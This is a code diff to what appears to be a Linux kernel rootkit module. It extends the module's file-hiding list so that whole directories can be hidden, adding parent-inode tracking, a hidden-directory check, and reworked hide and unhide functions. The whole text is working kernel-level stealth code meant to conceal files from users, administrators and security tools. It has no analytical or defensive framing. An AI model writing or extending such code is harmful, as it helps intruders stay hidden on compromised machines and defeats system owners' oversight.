@@ -156,9 +156,11 @@ struct fs_file_node* fs_get_file_node(const struct task_struct *task) {
 static LIST_HEAD(names_node);
 struct hidden_names {
     u64 ino;
+    u64 ino_parent;
     char *name;
     struct list_head list;
     bool ro;
+    bool is_dir;
 };
 
 bool fs_search_name(const char *name, u64 ino) {
@@ -176,39 +178,54 @@ bool fs_search_name(const char *name, u64 ino) {
     return false;
 }
 
+int fs_is_dir_inode_hidden(const char *name, u64 ino) {
+    struct hidden_names *node, *node_safe;
+    int count = 0;
+    list_for_each_entry_safe(node, node_safe, &names_node, list) {
+        if (node->is_dir && ino == node->ino_parent)
+            count++;
+    }
+    return count;
+}
+
 void fs_list_names(void) {
     struct hidden_names *node, *node_safe;
     list_for_each_entry_safe(node, node_safe, &names_node, list) {
-        prinfo("hidden: '%s'\n", node->name);
+        if (node->is_dir) {
+            prinfo("hidden: '%s' [directory] ino=%llu ino_parent=%llu\n", node->name, node->ino, node->ino_parent);
+        } else {
+            prinfo("hidden: '%s' ino=%llu\n", node->name, node->ino);
+        }
     }
 }
 
-static int _fs_add_name(const char *names[], bool ro, u64 ino) {
-    const char **s;
+static int _fs_add_name(const char *name, bool ro, u64 ino, u64 ino_parent, bool is_dir) {
+    size_t len;
 
-    if (!names)
+    if (!name)
         goto err;
 
-    for (s = names; *s != NULL; ++s) {
-        size_t len = strlen(*s);
-        if (!len)
-            continue;
+    len = strlen(name);
+    if (!len)
+        goto err;
 
-        if (!fs_search_name(*s, ino)) {
-            struct hidden_names *hn = kcalloc(1, sizeof(struct hidden_names) , GFP_KERNEL);
-            if (!hn)
-                return -ENOMEM;
 
-            hn->name = kcalloc(1, len+1, GFP_KERNEL);
-            strncpy(hn->name, (const char*)*s, len);
-            hn->ro = ro;
-            hn->ino = ino;
-            /** the gap caused by banned words
-             * is the most fun
-             */
-            prinfo("hide: '%s'\n", hn->name);
-            list_add_tail(&hn->list, &names_node);
-        }
+    if (!fs_search_name(name, ino)) {
+        struct hidden_names *hn = kcalloc(1, sizeof(struct hidden_names) , GFP_KERNEL);
+        if (!hn)
+            return -ENOMEM;
+
+        hn->name = kcalloc(1, len+1, GFP_KERNEL);
+        strncpy(hn->name, (const char*)name, len);
+        hn->ro = ro;
+        hn->ino = ino;
+        hn->is_dir = is_dir;
+        hn->ino_parent = ino_parent;
+        /** the gap caused by banned words
+         * is the most fun
+         */
+        prinfo("hide: '%s'\n", hn->name);
+        list_add_tail(&hn->list, &names_node);
     }
     return 0;
 err:
@@ -216,33 +233,35 @@ err:
     return -EINVAL;
 }
 
-int fs_add_name_ro(const char *names[], u64 ino) {
-    return _fs_add_name(names, true, ino);
+int fs_add_name_ro(const char *name, u64 ino) {
+    return _fs_add_name(name, true, ino, 0, false);
 }
 
-int fs_add_name_rw(const char *names[], u64 ino) {
-    return _fs_add_name(names, false, ino);
+int fs_add_name_rw(const char *name, u64 ino) {
+    return _fs_add_name(name, false, ino, 0, false);
 }
 
-bool fs_del_name(const char *names[]) {
+int fs_add_name_rw_dir(const char *name, u64 ino, u64 ino_parent, bool is_dir) {
+    return _fs_add_name(name, false, ino, ino_parent, is_dir);
+}
+
+bool fs_del_name(const char *name) {
+    struct hidden_names *node, *node_safe;
     int deleted = 0;
 
-    if (names) {
-        struct hidden_names *node, *node_safe;
-        const char **s;
-        for (s = names; *s != NULL; ++s) {
-            list_for_each_entry_safe(node, node_safe, &names_node, list) {
-                if (node->ro) continue;
-                if (!strcmp(node->name, *s)) {
-                    prinfo("unhide: '%s'\n", *s);
-                    list_del(&node->list);
-                    if (node->name)
-                        kfree(node->name);
-                    kfree(node);
-                    node = NULL;
-                    ++deleted;
-                }
-            }
+    if (!name)
+        return false;
+
+    list_for_each_entry_safe(node, node_safe, &names_node, list) {
+        if (node->ro) continue;
+        if (!strcmp(node->name, name)) {
+            prinfo("unhide: '%s'\n", name);
+            list_del(&node->list);
+            if (node->name)
+                kfree(node->name);
+            kfree(node);
+            node = NULL;
+            ++deleted;
         }
     }
 
@@ -258,6 +277,26 @@ void fs_names_cleanup(void) {
         kfree(node);
         node = NULL;
     }
+}
+
+static struct inode *_fs_get_parent_inode(struct path *file_path) {
+    struct dentry *parent_dentry;
+    if (!file_path) {
+        prerr("%s: invalid argument: %p\n", __FUNCTION__, file_path);
+        return NULL;
+    }
+
+    parent_dentry = dget_parent(file_path->dentry);
+    if (parent_dentry)
+        return parent_dentry->d_inode;
+    return NULL;
+}
+
+u64 fs_get_parent_inode(struct path *file_path) {
+    struct inode *inode = _fs_get_parent_inode(file_path);
+    if (inode)
+        return inode->i_ino;
+    return 0;
 }
 
 struct file *fs_kernel_open_file(const char *name) {
